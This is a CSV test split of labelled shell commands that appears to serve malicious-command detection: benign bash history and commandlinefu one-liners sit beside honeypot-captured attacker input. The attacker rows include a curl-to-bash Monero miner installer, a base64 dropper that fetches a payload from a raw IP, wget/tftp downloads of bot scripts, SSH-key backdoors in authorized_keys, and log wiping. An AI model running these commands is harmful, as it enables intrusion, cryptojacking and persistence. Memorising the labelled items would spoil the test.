id,command,label,source,split
d2_005167,sudo apt install ksnapshot,0,bash_history,test
d2_005168,/share/ClusterShare/software/contrib/kevyin/eclipse/eclipse -v,0,bash_history,test
d2_005172,cat /dev/null > /var/log/secure,1,honeypot,test
d2_005175,touch 1-saving,0,bash_history,test
d2_005184,su - ansadmin,0,bash_history,test
d2_005187,cat app.py,0,bash_history,test
d2_005189,sudo pacman -Rs rxvt-unicode,0,bash_history,test
d2_005193,/bin/busybox echo -en '\x7f\x45\x4c\x46\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x28\x00\x01\x00\x00\x00\x8c\x83\x00\x00\x34\x00\x00\x00\x88\x04\x00\x00\x02\x00\x00\x04\x34\x00\x20\x00\x03\x00\x28\x00\x07\x00\x06\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x80\x00\x00\x38\x04\x00\x00\x38\x04\x00\x00\x05\x00\x00\x00\x00\x80\x00\x00\x01\x00\x00\x00\x38\x04\x00\x00\x38\x04\x01\x00\x38\x04\x01\x00\x0c\x00\x00\x00\x14\x00\x00\x00\x06\x00\x00\x00\x00\x80\x00\x00\x51\xe5\x74\x64\x00\x00\x00\x00\x00\x00\x00\x00' > .dropper,1,honeypot,test
d2_005195,>/etc/t,1,honeypot,test
d2_005197,cat hs_err_pid29981.log,0,bash_history,test
d2_005199,for i in G M K; do du -hx /var/ | grep [0-9]$i | sort -nr -k 1; done | less,0,commandlinefu,test
d2_005205,/bin/busybox echo -e '\x47\x72\x6f\x70/etc/resolv.conf' > /etc/resolv.conf/.nippon,1,honeypot,test
d2_005206,vim server_check.py,0,bash_history,test
d2_005223,/bin/busybox rm -f /proc/irq/.nippon,1,honeypot,test
d2_005239,./06i9wRXJ,1,honeypot,test
d2_005251,"ps -eo pcpu,user,pid,cmd | sort -r | head -5",0,commandlinefu,test
d2_005263,sudo apt-get remove cuda*,0,bash_history,test
d2_005271,"curl -s http://h8b0517b6.example.net/ | grep -oP '(\d{1,3}\.){3}\d+'",0,commandlinefu,test
d2_005272,bash install-sh,0,bash_history,test
d2_005273,javac,0,bash_history,test
d2_005275,scp -t /var/tmp/12sp3kdwelhwyjybu2y9xt07un,1,honeypot,test
d2_005293,"stf=$(date +%s.%N);for ((;;));do ctf=$( date +%s.%N );echo -en ""\r$(date -u -d ""0 $ctf sec - $stf sec"" ""+%H:%M:%S.%N"")"";done",0,commandlinefu,test
d2_005294,lpoption -l,0,bash_history,test
d2_005297,getent shadow | grep '^[^:]\+:!' | cut -d: -f1,0,commandlinefu,test
d2_005303,ls -al /proc/<PID>/fd,0,commandlinefu,test
d2_005314,rosrun auv_debug electronics_interface,0,bash_history,test
d2_005319,vi ./elpa/archives/melpa,0,bash_history,test
d2_005322,-rw-rw-r-- 1 terror terror 10746 Jul 22 2016 README.txt,0,bash_history,test
d2_005328,nvram set http_passwd=root:VivBPucWpUL,1,honeypot,test
d2_005347,sudo apt purge astrill,0,bash_history,test
d2_005350,find ../../ -name convertFastqToFastaRight.sh,0,bash_history,test
d2_005357,vid=$(lspci | grep VGA | cut -f5- -d ' '),1,honeypot,test
d2_005358,"git config global user.name ""aravind""",0,bash_history,test
d2_005361,"for device in /sys/bus/pci/devices/*; do echo ""$(basename ${device} | cut -c '6-') $(cut -c '3-6' ${device}/class): $(cut -c '3-' ${device}/vendor):$(cut -c '3-' ${device}/device)""; done",0,commandlinefu,test
d2_005371,chmod 777 yoyobins.sh,1,honeypot,test
d2_005376,cd /home/$USER,1,honeypot,test
d2_005377,wget http://hf631ad94.example.net/n3,1,honeypot,test
d2_005378,vim -o file1 file2...,0,commandlinefu,test
d2_005383,wget http://h9ac73aee.example.net/iYY1b/bot.pl,1,honeypot,test
d2_005411,"awk '{if(NR==1)sub(/^\xef\xbb\xbf/,"""");print}' text.txt > newFile.txt",0,commandlinefu,test
d2_005413,sudo pacman -S alsa-utils alsa-plugins,0,bash_history,test
d2_005419,crontab -e 00 09 * * * /usr/share/nginx/html/advanced-test/yii check-contracts/collect,0,bash_history,test
d2_005421,cat /etc/ansible,0,bash_history,test
d2_005427,journalctl -u lora-app-server -f,0,bash_history,test
d2_005432,cat << EOF > osp_jumpbox_inventory,0,bash_history,test
d2_005438,grep - num -c,0,bash_history,test
d2_005442,ftp>!w,0,commandlinefu,test
d2_005463,/bin/busybox echo -e '\x47\x72\x6f\x70/proc' > /proc/.nippon,1,honeypot,test
d2_005467,ssh user@server | tee logfilename,0,commandlinefu,test
d2_005470,PuTTY Fatal Error,1,honeypot,test
d2_005473,python v.py,1,honeypot,test
d2_005476,git config --system --add color.status true,0,bash_history,test
d2_005483,mvim,0,bash_history,test
d2_005487,cat aws |grep -v total >l,0,bash_history,test
d2_005488,cp .LESS_TERMCAP ~,0,bash_history,test
d2_005497,du -m --max-depth=1 [DIR] | sort -nr,0,commandlinefu,test
d2_005501,rm -r .[!.]*,0,commandlinefu,test
d2_005513,rm -rf n3*,1,honeypot,test
d2_005514,plymouthd,0,bash_history,test
d2_005515,it,0,bash_history,test
d2_005520,cat INSTALL,0,bash_history,test
d2_005525,curl -X POSTstseo.com/apis,0,bash_history,test
d2_005527,/bin/busybox chmod +x lol,1,honeypot,test
d2_005546,sudo service mongodb status,0,bash_history,test
d2_005547,run 0dao100.sh,0,bash_history,test
d2_005549,rm -rf bins.sh tftp1.sh tftp2.sh,1,honeypot,test
d2_005558,hostname -i,0,bash_history,test
d2_005563,sh ssh3.sh,1,honeypot,test
d2_005566,rm *.mkv,0,bash_history,test
d2_005570,git remote add originsplamas/Frensh.git,0,bash_history,test
d2_005571,"/bin/busybox rm -f /sys/fs/cgroup/cpu,cpuacct/.nippon",1,honeypot,test
d2_005573,vi nginx.conf,0,bash_history,test
d2_005576,ls Packages/Sites/,0,bash_history,test
d2_005581,find . -type f -print0 | xargs -0 rename 's/\ //g',0,commandlinefu,test
d2_005586,nano conff,1,honeypot,test
d2_005599,/bin/busybox cat /proc/.nippon,1,honeypot,test
d2_005603,ansible-vault view group_vars/all/vault_all.yml,0,bash_history,test
d2_005605,"find . -type d -name .svn -exec chmod g+s ""{}"" \;",0,commandlinefu,test
d2_005610,git clonestoread/ExpectAnim.git,0,bash_history,test
d2_005612,rm -f /dev/.nippon,1,honeypot,test
d2_005614,less .git/HEAD,0,bash_history,test
d2_005616,apt install -y $packages,0,bash_history,test
d2_005631,/bin/busybox rm -f /dev/mqueue/.nippon,1,honeypot,test
d2_005639,vim settings.ini,0,bash_history,test
d2_005644,apt-cache search PHP|less,0,bash_history,test
d2_005645,java Atm,0,bash_history,test
d2_005647,rm -rf .bashrc,1,honeypot,test
d2_005649,./loligang.arm7 loligang.arm7,1,honeypot,test
d2_005656,trickle -d 60 wget http://h66785f5d.example.net/file,0,commandlinefu,test
d2_005658,git merge,0,bash_history,test
d2_005659,pgrep schkd,0,bash_history,test
d2_005675,mv ~/Downloads/kafka_2.11-30.107.98.238.tgz ..,0,bash_history,test
d2_005678,rm -rf climb3r,0,bash_history,test
d2_005685,ps -elf,0,bash_history,test
d2_005687,locate lohn,0,bash_history,test
d2_005690,command du -hax | sort -hr | head -n 10,0,bash_history,test
d2_005692,whereis tomcat-bin,0,bash_history,test
d2_005697,vim app/models/author.rb,0,bash_history,test
d2_005699,ls -lr pylast.egg-info/,0,bash_history,test
d2_005708,grep eth0 /proc/net/arp,0,bash_history,test
d2_005713,./n 1.1,1,honeypot,test
d2_005714,"cp filename{,.`date +%Y%m%d`}",0,commandlinefu,test
d2_005716,vi /etc/selinux,0,bash_history,test
d2_005720,/bin/busybox cat /tmp/.none,1,honeypot,test
d2_005730,sudo test2.py,0,bash_history,test
d2_005731,apt-get --just-print upgrade,0,commandlinefu,test
d2_005738,rm vokoscreen-2017-04-26_13-32-02_edit_w4_UI_and_UX_1.mkv,0,bash_history,test
d2_005741,tac $FILE,0,commandlinefu,test
d2_005745,pv -cN orig < foo.tar.bz2 | bzcat | pv -cN bzcat | gzip -9 | pv -cN gzip > foo.tar.gz,0,commandlinefu,test
d2_005752,sudo passwd tecmin,1,honeypot,test
d2_005764,until !!; do :; done,0,commandlinefu,test
d2_005765,deactiavate,0,bash_history,test
d2_005768,touch johan,0,bash_history,test
d2_005771,"perl -ne 'while (/([0-9]+\.){3}[0-9]+/g) {print ""$&\n""};' file.txt",0,commandlinefu,test
d2_005772,ls src/,0,bash_history,test
d2_005775,git pullsureshyadav/DEVOPS1.git dev,0,bash_history,test
d2_005778,ls -F,0,bash_history,test
d2_005781,"mkdr "" """,0,bash_history,test
d2_005785,vi i3exit,0,bash_history,test
d2_005786,vim ~/.cache/wal/colors-rofi-dark.rasi,0,bash_history,test
d2_005798,wget http://h5f4946c0.example.net/miori.x86,1,honeypot,test
d2_005807,alias tail='tail -n $((${LINES:-`tput lines 2>/dev/null||echo -n 80`} - 7))',0,commandlinefu,test
d2_005809,strings /usr/sbin/sshd | grep %s:%s -A2 -B2,1,honeypot,test
d2_005811,find -name *digital_filter*,0,bash_history,test
d2_005814,find . -name '*.desktop' | sed s/[^/]*\.desktop$// | uniq -c | sort -g,0,commandlinefu,test
d2_005818,"printf ""\033[48;2;%d;%d;%dm"", r,g,b;",0,bash_history,test
d2_005819,"sudo who | awk '!/root/{ cmd=""/sbin/pkill -KILL -u "" $1; system(cmd)}'",0,commandlinefu,test
d2_005822,lsof -Pn | grep LISTEN,0,commandlinefu,test
d2_005825,bash:bash: [CHG]: command not found,0,bash_history,test
d2_005826,swift,0,bash_history,test
d2_005829,"function every() { sed -n -e ""${2}q"" -e ""0~${1}p"" ${3:-/dev/stdin}; }",0,commandlinefu,test
d2_005834,"for code in $(find . -type f -name '*.p[ml]'); do perl -c ""$code""; done",0,commandlinefu,test
d2_005839,vi /datadev/homes/mikec/scripts-mikec/python/excelToCSV.py,0,bash_history,test
d2_005849,"echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAIBbHnwvrLBoGR/DCb64o5GMROkX8TP89+SkSn2LP4dI7szHtr3yD3EbtQ6TWrmE/Ai4j8f/t7nTBy4FnGTmQdmI1zyAUN0eGmZXbfGG//Fl2CTdxDNra1FtBnpV1oIRO8o0ebQyxjuTC+A6hEKWpzOa7uEeapkiiUYiBwU2stgdDw== rsa-key-20131125"" >> authorized_keys",1,honeypot,test
d2_005851,locare sys | grep stat.h,0,bash_history,test
d2_005855,import MySQLdb,0,bash_history,test
d2_005858,mv mvn.zip /home/sumit/,0,bash_history,test
d2_005861,grep eth0 /proc/net/arp | sort -n | sed '/\(\.10\ \)/d'|xcol 192,0,bash_history,test
d2_005864,tar -cf - . | pv -s $(du -sb . | awk '{print $1}') | gzip > out.tgz,0,commandlinefu,test
d2_005871,curl -s -L https://h3cf88e0a.example.net/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s '45yAseASQEo7674bgXA39LH3D633Hwksa69VQaRbGpSgKYvJTFfdnxHRJUhyipp6397SJktzBj2eJ7V7eJpRVBkmNvwj4to',1,honeypot,test
d2_005877,git ssh keygen,0,bash_history,test
d2_005882,apt-cyg install php,0,bash_history,test
d2_005891,!@#$1234,1,honeypot,test
d2_005892,clip < /home/cs5530u69/.ssh/id_rsa.pub,0,bash_history,test
d2_005896,rails new addressbook,0,bash_history,test
d2_005900,bash -c ./abzoOIwL,1,honeypot,test
d2_005901,echo $(cat file),0,commandlinefu,test
d2_005905,clear;pianobar,0,bash_history,test
d2_005908,rlwrap mosml,0,commandlinefu,test
d2_005911,for i in sys dev proc; do sudo mount --bind /$i /mnt/xxx/$i; done,0,commandlinefu,test
d2_005912,sudo vim /etc/default/grub,0,bash_history,test
d2_005914,sudo mysql -u root -p,0,bash_history,test
d2_005915,touch Add.c,0,bash_history,test
d2_005916,>/var/tmp/.t,1,honeypot,test
d2_005933,[goalador@gatanda corpwebsite-starterkit]$ [goalador@gatanda corpwebsite-starterkit]$ for : webappcreations,0,bash_history,test
d2_005938,git cloneshekhariitbhu/Android-MVP-Sample-Application.git,0,bash_history,test
d2_005946,mv *.apk ~/Downloads/,0,bash_history,test
d2_005951,nohup /root/syn2023 &gt,1,honeypot,test
d2_005953,sudo iptables -L TRAFFIC_OUT -n -v|grep 192|awk '{ print $8 }'|sort -n,0,bash_history,test
d2_005964,lscd,0,bash_history,test
d2_005975,perl flo 161.63.78.223 80 0,1,honeypot,test
d2_005976,journalctl --no-pager --since today --grep 'fail|error|fatal' --output json | jq '._EXE' | sort | uniq -c | sort --numeric --reverse --key 1,0,commandlinefu,test
d2_005977,[[ ${var##*yourstring*} != ${var} ]],0,commandlinefu,test
d2_005982,diff <(openssl x509 -noout -modulus -in server.crt ) <( openssl rsa -noout -modulus -in server.key ),0,commandlinefu,test
d2_005983,tftp 10.76.82.96 -c get tftp1.sh,1,honeypot,test
d2_005987,vi p,0,bash_history,test
d2_005988,sysctl hw.model,1,honeypot,test
d2_005991,"rtmpdump -v -r rtmp://livestfslivefs.fplive.net/livestfslive-live/ -y ""aljazeera_en_veryhigh"" -a ""aljazeeraflashlive-live"" -o -| mplayer -",0,commandlinefu,test
d2_005992,ls -al /usr/bin/vi,0,bash_history,test
d2_005998,python -c 'return 1+1',0,bash_history,test
d2_006005,sudo iptables -t nat -L -nv,0,bash_history,test
d2_006009,sudo smbclient,0,bash_history,test
d2_006011,ls -lt /home/lohn4,0,bash_history,test
d2_006012,lynx -dump http://h3b7fda86.example.net/ip_tracer/?QRY=$1|sed -nr s/'^.*My IP address city: (.+)$/\1/p',0,commandlinefu,test
d2_006013,sudo yum install clip,0,bash_history,test
d2_006015,./dVNBkixy,1,honeypot,test
d2_006016,scp -t /var/tmp/r,1,honeypot,test
d2_006019,for i in *.cbr ; do mkdir ${i/\.cbr/} ; cp $i ${i/\.cbr/}/${i/cbr/rar} ; cd ${i/\.cbr/} ; unrar e ${i/cbr/rar} ; rm ${i/cbr/rar} ; cd .. ; zip -r ${i/cbr/cbz} ${i/\.cbr/} ; rm -r ${i/\.cbr/} ; done,0,commandlinefu,test
d2_006022,eit,0,bash_history,test
d2_006035,git checkout HEAD^ wp-content/themes/i9-responsive-child-theme/home.php,0,bash_history,test
d2_006041,dev/R_DataScience/,0,bash_history,test
d2_006042,rm .file.un~,0,bash_history,test
d2_006046,git clone git@37.118.127.212:sschepis/shape-shifter,0,bash_history,test
d2_006053,rm loligang.ppc -rf,1,honeypot,test
d2_006056,"find . -name ""pattern"" -type f -exec du -ch {} + | tail -n1",0,commandlinefu,test
d2_006059,"echo ""IyEvYmluL2Jhc2gKY2QgL3RtcApybSAtcmYgLlgxNS11bml4Cm1rZGlyIC5YMTUtdW5peApjZCAuWDE1LXVuaXgKcGtpbGwgLTkgY3JvbiA+IC5vdXQKd2dldCAtcSBodHRwOi8vNTQuMzcuNzAuMjQ5L2RvdGEyLnRhci5neiB8fCBjdXJsIC1PIC1mIGh0dHA6Ly81NC4zNy43MC4yNDkvZG90YTIudGFyLmd6CnNsZWVwIDdzICYmIHRhciB4ZiBkb3RhMi50YXIuZ3oKI3JtIC1yZiBkb3RhMi50YXIuZ3oKY2QgLnJzeW5jCmNobW9kIDc3NyAqCmNkIC90bXAvLlgxNS11bml4Ly5yc3luYy9hICYmIC4vY3JvbiB8fCAuL2FuYWNyb24KZXhpdCAw"">.threatstackcloudsecops",1,honeypot,test
d2_006060,perl muie,1,honeypot,test
d2_006063,vim cloud_sim_client.py,0,bash_history,test
d2_006064,ftpget -v -u anonymous -p anonymous -P 21 177.218.217.227 sensi1.sh sensi1.sh,1,honeypot,test
d2_006068,/bin/busybox echo -e '\x50\x6f\x72\x74/dev/pts' > /dev/pts/.none,1,honeypot,test
d2_006070,ffmpeg -i input.flv -f mp3 -vn -acodec copy ouput.mp3,0,commandlinefu,test
d2_006076,ip a s eth0 | sed -nr 's!.*inet ([^/]+)/.*!\1!p',0,commandlinefu,test
d2_006077,"mv It.2017.720p.BluRay.x264-\[YTS.AG\].mp4 ""It (2017).mp4""",0,bash_history,test
d2_006091,echo -n $(curl -Ss http://h524dbf63.example.net | xclip,0,commandlinefu,test
d2_006094,"for f in *.mp3 ; do lame --mp3input -b 128 ""$f"" ./resamp/""$f"" ; done",0,commandlinefu,test
d2_006101,mv b c,0,bash_history,test
d2_006109,su - sumit.kumari,0,bash_history,test
d2_006118,wget NasaPaul.com/paul,1,honeypot,test
d2_006119,/bin/busybox rm -f /sys/fs/cgroup/systemd/.nippon,1,honeypot,test
d2_006120,nano passfile,1,honeypot,test
d2_006122,sed -i 's/exit()/exit(0)/g' sysproc.c,0,bash_history,test
d2_006134,sudo npm install --save-dev gulp-webp,0,bash_history,test
d2_006135,cat trabalho2.sh,0,bash_history,test
d2_006138,mv digital_ocean* .ssh/,0,bash_history,test
d2_006141,./teste4,0,bash_history,test
d2_006142,sudo apt-get upgrade,0,bash_history,test
d2_006145,"/bin/busybox echo -e '\x47\x72\x6f\x70/sys/fs/cgroup/cpu,cpuacct' > /sys/fs/cgroup/cpu,cpuacct/.nippon",1,honeypot,test
d2_006149,python crack.py emails.txt 400 0,1,honeypot,test
d2_006151,if (g>255) g = 510-g;,0,bash_history,test
d2_006158,curl http://hcf3da157.example.net/w.txt -o sdf3fslsdf15,1,honeypot,test
d2_006159,"setxkbmap -option grp:switch,grp:alt_shift_toggle,grp_led:scroll us,es",0,commandlinefu,test
d2_006172,"ldapsearch -h ldapserver.willeke.com -p389 -b """" -s base -D cn=admin,ou=administration,dc=willeke,dc=com -w secretpwd ""(objectclass=*)"" chainings removeEntryOps referralsReturned listOps modifyRDNOps repUpdatesIn repUpdatesOut strongAuthBinds addEntryOps",0,commandlinefu,test
d2_006186,less ~/ .ssh/id_rsa,0,bash_history,test
d2_006192,wget http://hce28530f.example.net/xL,1,honeypot,test
d2_006209,LC_ALL=C /dev/shm/pl5nk4d8jqfd3vdu8pva6s5ghk,1,honeypot,test
d2_006218,ergergerge,1,honeypot,test
d2_006221,vim ./offboard/simulation/cloud_sim/python/cloud_sim_status.py,0,bash_history,test
d2_006225,"git config --global diff.external 'bash -c ""meld $2 $5""'",0,commandlinefu,test
d2_006232,bash --help,0,bash_history,test
d2_006234,cp ~/Downloads/darwin/Timing\ Data/0710_GreatBritain/Race/Race\ Sector\ Analysis.mat rsa.mat,0,bash_history,test
d2_006239,>/bin/.file,1,honeypot,test
d2_006245,sudo systemctl status jekins,0,bash_history,test
d2_006256,sudo /etc/init.d/kdm start,0,bash_history,test
d2_006263,"svn st | awk ' {if ( $1 == ""?"" ){print $1="""",$0}} ' | sed -e 's/^[ \t]*//' | sed 's/ /\\ /g' | xargs svn add",0,commandlinefu,test
d2_006276,"echo $LS_COLORS | sed 's/:/\n/g' | awk -F= '!/^$/{printf(""%s \x1b[%smdemo\x1b[0m\n"",$0,$2)}'",0,commandlinefu,test
d2_006283,git add --all :/,0,bash_history,test
d2_006286,rm nohup.out out.txt t,0,bash_history,test
d2_006293,less 32.txt,0,bash_history,test
d2_006297,"grep ""^[^#;]"" /etc/php.ini",0,commandlinefu,test
d2_006299,cp ~/Downloads/scrooloose-snipmate-snippets-15cb6bf.zip ./,0,bash_history,test
d2_006304,dmesg | grep irtual,1,honeypot,test
d2_006310,sudo powertop,0,commandlinefu,test
d2_006314,passwore,1,honeypot,test
d2_006321,scp id_rsa.pub root@www32372ue.sakura.ne.jp:~/,0,bash_history,test
d2_006325,setfile -a V foo.bar; setfile -a v foo.bar;,0,commandlinefu,test
d2_006327,sudo git commit -a -m 'cambios en caliente',0,bash_history,test
d2_006331,pico simnao.sh,0,bash_history,test
d2_006333,"echo -e """"z,iyd86I""\nKsmhOIlV1wEl\nKsmhOIlV1wEl"" | passwd | bash",1,honeypot,test
d2_006338,git diff palind.rb,0,bash_history,test
d2_006344,tar xzvf b.tgz,0,bash_history,test
d2_006346,for i in `ls ~/.mozilla/firefox/*/Cache`; do file $i | grep -i mpeg | awk '{print $1}' | sed s/.$//; done,0,commandlinefu,test
d2_006347,mpiicc -h,0,bash_history,test
d2_006351,cat /dev/null > /var/log/dmesg,1,honeypot,test
d2_006355,ls lib/python2.7/site-packages/,0,bash_history,test
d2_006357,vim copyright.yml,0,bash_history,test
d2_006359,sudo apt-get install eclipse,0,bash_history,test
d2_006366,touch media-loop.js,0,bash_history,test
d2_006375,strings /dev/urandom | tr -cd '[:alnum:]' | fold -w 30 | head -n 1,0,commandlinefu,test
d2_006376,echo 'ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAvN5GkpS25Z9eA2bARaXTVfVN2m/N5V5ddOTyVPftA3ljorQitmh1pyuZDty9oTWF+J0cOtGBvRaQ7NvZCaDC2q6QR0iMOfq7zs+4bl8WO8UnaQcVVIBeEt3YPo8PXwVm5fR4wgoq9SZp29/2jFz0UmAOhiUyImh9/P7jFWqpv3gSxZ8neq+4pSCUfE24OGiFBpJGkAE+wMmJcBX0WjFfjedcbBs1FO/C+x8WY9bFkQ3NwwjVbh3c3mYy9zqdPhm6GI/heVAZUWSKHausOwb+Rem+eKhkrKvoeteqJXEIrlLbHyRHn+12nN/qgG5kIcICv4TRD59GHMYZH3ILngyFJQ==' >> .ssh/.auth_k,1,honeypot,test
d2_006378,ps -ef|grep ssh,0,bash_history,test
d2_006380,tar zxvf team.tgz,0,bash_history,test
d2_006384,tail -n 100 .i3/i3log | less,0,bash_history,test
d2_006387,"for file in *.pdf; do convert -verbose -colorspace RGB -resize 800 -interlace none -density 300 -quality 80 ""$file"" ""${file//.pdf/.jpg}""; done",0,commandlinefu,test
d2_006408,"/bin/busybox cat /sys/fs/cgroup/cpu,cpuacct/.nippon",1,honeypot,test
d2_006416,ls !$,0,commandlinefu,test
d2_006417,rails new mytest,0,bash_history,test
d2_006418,"for w in [WORT1] [WORTn]; do wget -O $w.mp3 $(wget -O - ""http://hd2cc5893.example.net/rechtschreibung/$w"" | grep -o ""http://hd2cc5893.example.net/_media_/audio/[^\.]*\.mp3""); done",0,commandlinefu,test
d2_006421,/bin/busybox cat /proc/keys/.nippon,1,honeypot,test
d2_006424,ftp ftp.cub.se,1,honeypot,test
d2_006429,"echo -e ""pass123\n2xV0WLuFM3vw\n2xV0WLuFM3vw"" | passwd | bash",1,honeypot,test
d2_006438,mysql -u root -proot,0,bash_history,test
d2_006441,sudo cd /tmp,1,honeypot,test
d2_006448,meld,0,bash_history,test
d2_006455,sudo modprobe -h,0,bash_history,test
d2_006456,sed 's/\b\(0*\)//g' filename,0,commandlinefu,test
d2_006468,git rm -r *,0,bash_history,test
d2_006472,ls -lt | more,0,commandlinefu,test
d2_006477,feh --bg-scale ~/.config/Wallpaper.jpg,0,bash_history,test
d2_006479,rm .exception.c.swp,0,bash_history,test
d2_006480,docker build -t sfy-metriks-registry-dev.af.multis.p.fti.net/metriks/cerebro:0.8.3 .,0,bash_history,test
d2_006488,less www/static/js/job.js,0,bash_history,test
d2_006493,"echo $(grep ""^[^'A-Z]\{3,7\}$"" /usr/share/dict/words|shuf -n4)",0,commandlinefu,test
d2_006494,sysv-rc-conf list,0,bash_history,test
d2_006502,ssh JSDiBaggio@25.120.2.155,0,bash_history,test
d2_006508,chef generate template index.html,0,bash_history,test
d2_006516,echo zVkYSMYO7BnR1yAz) | passwd,1,honeypot,test
d2_006521,tar xvf make-4.1.tar.bz2,0,bash_history,test
d2_006524,sudo mv -R deurbel/ /etc/services/deurbel,0,bash_history,test
d2_006538,nbano,1,honeypot,test
d2_006545,make modules_install,0,bash_history,test
d2_006549,"echo ""zeroshell"" | sh -c ""sed '#/lib/libxml.so#d' /etc/ld.so.preload > /etc/ld.so.preload""",1,honeypot,test
d2_006550,>/dev/netslink/.t,1,honeypot,test
d2_006562,"echo -e ""B""r0-Scherer\nFLSAWhpAhOXH\nFLSAWhpAhOXH"" | passwd | bash ; echo ""B""r0-Scherer\nFLSAWhpAhOXH\nFLSAWhpAhOXH\n"" | passwd",1,honeypot,test
d2_006564,grep -m 1 'stepping' /proc/cpuinfo | cut -d: -f2,1,honeypot,test
d2_006571,"quietly() { ""$@"" |&:; }",0,commandlinefu,test
d2_006572,rm popup.html,0,bash_history,test
d2_006573,mv a.out aaa,0,bash_history,test
d2_006584,"echo ""ID: ""`id`",1,honeypot,test
d2_006588,>/dev/.hbot,1,honeypot,test
d2_006600,tcpdump -s 0 -i eth0 'port 80' -w /root/storage/app/faxes/pcap2.pcap,0,bash_history,test
d2_006601,jhead -rgt file-name.jpg,0,commandlinefu,test
d2_006604,pinky,0,bash_history,test
d2_006606,cp /home/mjoe/downloads/nginx.vim nginx.vim,0,bash_history,test
d2_006613,xargs -n 2 mv < file_with_colums_of_names,0,commandlinefu,test
d2_006624,git checkout c87e189,0,bash_history,test
d2_006629,howodd 1 2 3 4,0,bash_history,test
d2_006631,vi /etc/fonts/fonts.conf,0,bash_history,test
d2_006633,"find-duplicates () { find ""$@"" -not -empty -type f -printf ""%s\0"" | sort -rnz | uniq -dz | xargs -0 -I{} -n1 find ""$@"" -type f -size {}c -print0 | xargs -0 md5sum | sort | uniq -w32 --all-repeated=separate; }",0,commandlinefu,test
d2_006635,axel --max-speed=x,0,commandlinefu,test
d2_006638,"alias ngrade=""nbgrader validate""",0,bash_history,test
d2_006647,git push -u origin maste,0,bash_history,test
d2_006650,"tt(){tree -pFCfa . | grep ""$1"" | less -RgIKNs -P ""H >>> ""}",0,commandlinefu,test
d2_006657,git rebase master feature-search-info-tooltip,0,bash_history,test
d2_006661,true | mailx -n -a MYTEXT.txt -r my@mail.com -s log -S smtp=mail.com -S smtp-auth-user=MYUSER -S smtp-auth-password=MYPASSWORD FRIEND@mail.com,0,commandlinefu,test
d2_006664,flash set SSH_PASSWORD zvlWbchM5kF4V,1,honeypot,test
d2_006676,"find -not -empty -type f -printf ""%-30s'\t\""%h/%f\""\n"" | sort -rn -t$'\t' | uniq -w30 -D | cut -f 2 -d $'\t' | xargs md5sum | sort | uniq -w32 --all-repeated=separate",0,commandlinefu,test
d2_006677,ps axuww|grep Trinity,0,bash_history,test
d2_006679,yaourt -Syu,0,bash_history,test
d2_006682,ll hcj-bak/,0,bash_history,test
d2_006683,vim theme.lua,0,bash_history,test
d2_006684,"wmctrl -o 1280,0",0,commandlinefu,test
d2_006698,sudo apt-get remvoe spotify-client,0,bash_history,test
d2_006699,runtime,1,honeypot,test
d2_006700,wget bad-team.info/bad,1,honeypot,test
d2_006709,./ywykKJL0,1,honeypot,test
d2_006725,sudo yum install cronie,0,bash_history,test
d2_006732,>/bin/t,1,honeypot,test
d2_006733,sed -i.`date +%Y%m%d` -e 's/pattern/replace' [filename],0,commandlinefu,test
d2_006736,LC_ALL=C /tmp/uibqi0ji48c0gmj475mhfle0k7,1,honeypot,test
d2_006742,wget nasapaul.com/.ninfo,1,honeypot,test
d2_006743,~/Documents/adt-bundle-mac-x86_64-20140321/sdk/platform-tools/adb 5555,0,bash_history,test
d2_006744,/usr/sbin/webcam.sh,0,bash_history,test
d2_006753,sys password zvlWbchM5kF4V,1,honeypot,test
d2_006757,>.hbot,1,honeypot,test
d2_006767,passwd: password unchanged,1,honeypot,test
d2_006778,git add koreaScatter.eps,0,bash_history,test
d2_006779,busybox wget http://h1812cd2f.example.net/Pemex.sh,1,honeypot,test
d2_006782,sudo mount,0,bash_history,test
d2_006786,mv ~/Downloads/ribbons_WGS84_ES .,0,bash_history,test
d2_006796,mv zombiePrac/ ranFiles/,0,bash_history,test
d2_006797,rm STDOUT/*,0,bash_history,test
d2_006800,watch !!,0,commandlinefu,test
d2_006801,take() { mkdir -p $1 && cd $1; },0,commandlinefu,test
d2_006802,with python versions older than 2.5,1,honeypot,test
d2_006807,touch teste,0,bash_history,test
d2_006810,git remote add originsia/os162.git,0,bash_history,test
d2_006812,chmod +x utILYqaW,1,honeypot,test
